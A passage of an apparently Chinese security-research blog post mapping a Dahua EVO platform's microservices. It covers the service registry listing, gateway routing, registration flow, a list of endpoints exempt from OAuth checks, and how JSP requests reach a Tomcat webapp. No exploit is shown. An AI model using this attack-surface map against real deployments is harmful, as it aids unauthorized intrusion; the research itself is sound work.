class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-apigw_BC-24-11-1C-9A-6A_8945&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-apigw&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8945</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;syncSource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NACOS&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46#8916#DEFAULT#DEFAULT_GROUP@@nacos:nacos-sync&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nacos:nacos-sync&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8916</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;cascade&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;cascadeProtocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icc&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;domainConfigPage&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/evo_cascade/domain_edit.html&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-brm_BC-24-11-1C-9A-6A_8918&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-brm&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8918</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.2.1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-log_BC-24-11-1C-9A-6A_8924&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-log&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8924</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpsPort&quot;</span><span class="punctuation">:</span> <span class="number">8928</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bc:24:11:1c:9a:6a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-oss&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8927</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-mr_BC-24-11-1C-9A-6A_9610&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-mr&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">9610</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flv_bc:24:11:1c:9a:6a_7886&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flv&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">7886</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-doc_BC-24-11-1C-9A-6A_9139&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-doc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">9139</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-job_BC-24-11-1C-9A-6A_8915&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-job&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8915</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prod&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;httpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tcpKeepaliveInfos&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;websocketBackend&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-arsm_bc:24:11:1c:9a:6a_8956&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;evo-arsm&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8956</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;developerModel&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;extParams&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;keepaliveConnInfo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.131.46_6556&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;paas-Fnode&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">6556</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1.1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;errMsg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;success&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>上面就是所有注册的微服务。但并不是所有的微服务，都是通过apigw进行转发的。</p>
+<p>来梳理一下evo-apigw是怎么起到微服务网关的作用的，evo-discover是怎么起到注册中心和服务发现的作用的，evo-brm等服务是怎么注册到evo-discover的，evo-oauth是怎么起到认证作用的，这三者之间的交互是怎么样的。</p>
+<h2 id="evo-apigw"><a href="#evo-apigw" class="headerlink" title="evo-apigw"></a>evo-apigw</h2><p>先看application.properties：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775630612738-1dd01d84-b1e7-46fa-960e-256d2445be06.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775630355149-c7884e88-9f87-4cbf-94b9-99c7c4cd3b7f.png"  alt="img"></p>
+<p>register系列的配置，是大华自己实现的逻辑，代表微服务注册。</p>
+<p>system.name定义了微服务名称。</p>
+<p>再看component.properties：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775630645756-9bb011a8-3269-4280-8730-d09b15bb1c75.png"  alt="img"></p>
+<p>register.server系列的配置，代表了微服务注册中心。</p>
+<p>register.node系列配置，代表了微服务的名称，端口等。</p>
+<p>register.subsystem系列配置，代表了此微服务的版本，是否需要订阅微服务列表等信息。</p>
+<p>oauth相关配置是认证服务用的。</p>
+<p>上面的配置说明，这个微服务evo-apigw，会向127.0.0.1:8916这个注册中心进行自动注册，且自动订阅所有的微服务；oauth认证在这个微服务不生效，默认放行所有路由。</p>
+<p>这里剧透一下，oauth认证是在apigw转发后的具体微服务里做的。</p>
+<p>现在要分析一下，apigw网关具体是怎么转发请求到各个微服务的。</p>
+<p>一个关键类com.dahua.evo.apigw.config.CustomRouteLocator，其转发逻辑，本质上基于Zuul网关：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775634019392-bf3d307f-225d-403b-8113-bec2939b2977.png"  alt="img"></p>
+<p>会根据服务名生成 <code>/服务名/**</code> 这一类 Zuul 路由。而服务名来自对evo-discover的订阅服务。</p>
+<p>具体会在com.dahua.evo.apigw.config.CustomRouteLocator#getMatchingRoute做转换：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775635887483-f8b3dc1c-bbb7-4f1b-85bf-ee6fcdb4dbb0.png"  alt="img"></p>
+<p>具体细节不展开了，本质还是Zuul网关转发。</p>
+<h2 id="evo-discover"><a href="#evo-discover" class="headerlink" title="evo-discover"></a>evo-discover</h2><p>evo-discover是一个tomcat项目，其位于\opt\evo\evo-common\Evo-discover\evo-discover：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775632321391-4a5b4445-90b6-4f8a-b21e-82454caaf043.png"  alt="img"></p>
+<p>所以源码位于WEB-INF&#x2F;classes，记得在idea里添加为库。</p>
+<p>其核心类为com.dahua.evo.discover.business.controller.DiscoverController：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775632500810-32379450-c66c-4c6d-bdba-4f7c34255c20.png"  alt="img"></p>
+<p>从方法注解就能看出各个接口的作用。</p>
+<p>比如看这个&#x2F;register，一看就知道是用来注册服务的。再看一下RegisterDTO这个参数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775632603392-28a5a85c-3c2e-4ebf-adb9-5efe164d6599.png"  alt="img"></p>
+<p>其内部类Param，与上面分析evo-apigw配置文件的结果能够对应。</p>
+<p>总结一下，注册中心discover大致有以下职能：</p>
+<p>1、其他微服务调用&#x2F;register接口注册，注册完返回一个token</p>
+<p>2、其他微服务带着token，请求&#x2F;heartbeat保活，让注册中心知道其他微服务正常</p>
+<p>3、其他微服务带着token和monitor（回调地址），请求&#x2F;subscribe，向注册中心订阅微服务列表</p>
+<p>4、定时将微服务列表变化推送给订阅者</p>
+<p>com.dahua.evo.discover.business.service.impl.NotifyServiceImpl：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633040911-3802ba87-9bee-4961-ac4c-3b0df648319f.png"  alt="img"></p>
+<p>能看到注册中心对apigw是有特殊关照的，专门有个静态final变量，保存apigw的回调地址。</p>
+<h2 id="evo-brm"><a href="#evo-brm" class="headerlink" title="evo-brm"></a>evo-brm</h2><p>这里主要关注evo-brm这种微服务是怎么注册到evo-discover中的。</p>
+<p>依旧是配置文件：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633206352-3ef932bd-e7b4-4ea2-b67c-ca0664128723.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633215205-be6977a7-5102-4eca-8e32-89b03541abec.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633287699-7e967394-44af-40db-8d4e-8eda3cb86804.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633302079-9bc1edc9-ad24-4f65-9587-c3267a80a506.png"  alt="img"></p>
+<p>再加上lib里的discover客户端依赖：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633515657-48f8d0ad-18ca-4f89-96d3-5cbb8730f009.png"  alt="img"></p>
+<p>能够判断，启动时，会自动调用discover客户端读取配置文件，然后注册到evo-discover。</p>
+<p>关于oauth配置，要看jar包里的oauth.properties：<br><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775633743125-1cde0e60-c0dc-4666-9f94-ba7c0f66d0c4.png"  alt="img"></p>
+<p>能看到有不需要oauth鉴权的接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oauth.permit=/**/secret-problem/list,/**/user/is-exist,/**/secret-problem/verify,/**/user/password-reset,/**/user/login,/**/index,/**/user/login-out,/**/discover/subscribe/callBack,/**/config/get-version,/**/version,/**/without-oauth/select-password-strength,/**/resources-info/all-resource,/**/device/io/import/excel/result/download/*,/**/subsystem/app-page-url,/**/encrypt/public-key,/**/thread/setting/test/**,/**/user/getCode,/**/user/getTime,/**/user/getCodeStat,/**/select-safe-config,/**/thread/setting/test/*,/**/config/product,/**/secret-problem/all,/**/oversea/platformInfo,/**/config/hidden-page-info</span><br></pre></td></tr></table></figure>
+
+<h2 id="evo-oauth"><a href="#evo-oauth" class="headerlink" title="evo-oauth"></a>evo-oauth</h2><p>这里只需要知道这个微服务是起到认证服务器的作用就行。</p>
+<p>第三方客户端会向它请求token，之后带着token去访问资源服务器，这里的资源服务器指使用oauth认证的各个微服务。</p>
+<p>详细分析见后面的“鉴权分析-apigw系列”</p>
+<h2 id="evo-apigw-nacos-sync-xxx-jsp的特殊性"><a href="#evo-apigw-nacos-sync-xxx-jsp的特殊性" class="headerlink" title="&#x2F;evo-apigw&#x2F;nacos-sync&#x2F;xxx.jsp的特殊性"></a>&#x2F;evo-apigw&#x2F;nacos-sync&#x2F;xxx.jsp的特殊性</h2><p>nacos-sync微服务，对应的是8916端口：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775628116698-5fc5e616-b8d2-45d2-8667-40c782aed532.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775626855028-8a583651-5765-43d1-9fca-d7b11f0b498a.png"  alt="img"></p>
+<p>可以看到，8916端口对应的是evo-discover服务，而这个服务的启动参数有些特殊，不是启动一个jar包，而是启动tomcat服务，能够看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dcatalina.base=/opt/evo/evo-common/Evo-discover/tomcat</span><br></pre></td></tr></table></figure>
+
+<p>于是查看该目录下的tomcat配置文件。</p>
+<p>查看conf&#x2F;server.xml：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775627088791-e05cbd1c-4c31-46b9-88b5-a8259d93be3e.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775627097475-1314279f-a7d6-4fcc-bbfe-f0840c0925a0.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775627150037-93a74021-3523-406e-a23c-d409bcd3923f.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775627158458-cc4613ee-b07d-4ae9-a8b3-aba989156406.png"  alt="img"></p>
+<p>有两个service，一个是8916端口，srd目录下的catalina service；另一个是8848端口，nacos下的nacos service。不过nacos-sync微服务对应的是8916端口，所以这里只关注catalina service就行。</p>
+<p>看一下srd目录：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1775628157654-0a75bbd1-b5c5-4126-8222-5b4e5c1e8646.png"  alt="img"></p>
+<p>现在能够理清了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/evo-apigw/nacos-sync/xxx.jsp</span><br><span class="line">-&gt; nginx 去掉 /evo-apigw/</span><br><span class="line">-&gt; evo-apigw 收到 /nacos-sync/xxx.jsp</span><br><span class="line">-&gt; 按服务名 nacos-sync 路由到 8916</span><br><span class="line">-&gt; 8916 上的 Tomcat 按 context path=/nacos-sync 处理</span><br><span class="line">-&gt; 最终落到 tomcat/srd/nacos-sync 对应的 webapp 目录</span><br></pre></td></tr></table></figure>
+
